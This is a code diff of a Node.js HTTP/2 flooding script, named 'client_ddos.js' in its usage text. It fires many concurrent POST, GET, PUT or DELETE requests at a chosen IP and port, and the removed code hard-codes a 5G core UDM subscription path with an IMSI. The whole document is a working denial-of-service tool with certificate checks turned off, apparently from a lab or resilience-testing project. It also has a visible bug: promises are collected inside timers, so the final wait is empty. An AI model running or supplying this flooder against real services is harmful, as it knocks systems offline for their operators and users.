@@ -1,46 +1,64 @@
 const http2 = require('http2');
+const Http2Request = require('./http2request');
 
-async function makeRequest(id,ip,port,numberOfRequests) {
-    let address= 'http://'.concat(ip).concat(':').concat(port).concat('/');
-    console.log(ip," ",port);
-    for (let i = 0; i < numberOfRequests ; i++) {
-        console.log(`Thread ${id}: Making request ${i + 1}...`);
-        const client = http2.connect(address,{
-          requestCert: false, // put true if you want a client certificate, tested and it works
-          rejectUnauthorized: false
-          });
-        const req = client.request({
-            ':method': 'POST',
 
-            ':path': '/nudm-sdm/v2/imsi-460020301001001/sdm-subscriptions'
-          
-        });
-        req.end();
-        await new Promise(resolve => {
-          req.on('response', () => {
-            resolve();
-          });
-        });
-        await new Promise(resolve => setTimeout(resolve, 100));
-        client.close();
-      }
-  }
-  
   async function main() {
+    try{
+      if(process.argv.length!=7){
+        console.log("Insert ip - port - number of requests - number of threads - Http2 Method ");
+        console.log("An example of utilization could be:");
+        console.log("node client_ddos.js localhost 8000 20 1000 POST");
+        process.exit(1);
+      }
+      const [ip, port, numberOfRequests,numberOfThreads,httpMethod] = process.argv.slice(2);
+      const http2Request= new Http2Request(ip,port,numberOfRequests);
+
+      console.log("   \n",ip," ",port," ",numberOfRequests," ",numberOfThreads," ",httpMethod);
+      const promises = [];
+
+      switch(httpMethod.toUpperCase()){
+        case("POST"):
+            for (let i = 0; i < numberOfThreads; i++) {
+              setTimeout( ()=>promises.push(http2Request.makeRequestPost(i)),500);
+            }
+            await Promise.all(promises);
+            break;
+
+        case("GET"):
+            for (let i = 0; i < numberOfThreads; i++) {
+              setTimeout( ()=>promises.push(http2Request.makeRequestGet()),500);
+            }
+            await Promise.all(promises);
+            break;
+
+        case("PUT"):
+            for (let i = 0; i < numberOfThreads; i++) {
+              setTimeout( ()=>promises.push(http2Request.makeRequestPut()),500);
+            }
+            await Promise.all(promises);
+            break;
 
 
-    if(process.argv.length!=6){
-      console.log("Insert ip - port - number of requests - number of threads ");
-      process.exit(1);
-    }
-    const [ip, port, numberOfRequests,numberOfThreads] = process.argv.slice(2);
-    console.log("   \n",ip,port,numberOfRequests," ",numberOfThreads);
+        case("DELETE"):
+            for (let i = 0; i < numberOfThreads; i++) {
+              setTimeout( ()=>promises.push(http2Request.makeRequestDelete()),500);
+            }
+            await Promise.all(promises);
+            break;
 
-    const promises = [];
-    for (let i = 0; i < numberOfThreads; i++) {
-      setTimeout( ()=>promises.push(makeRequest(i + 1,ip,port,numberOfRequests)),1000);
-    }
-    await Promise.all(promises);
+            default:
+              console.log("Insert a valid http2 method");
+              break;
+
+
+
+      }
+   }
+   catch(error){
+      console.error(error.message);
+
+     }
   }
+
   
   main();
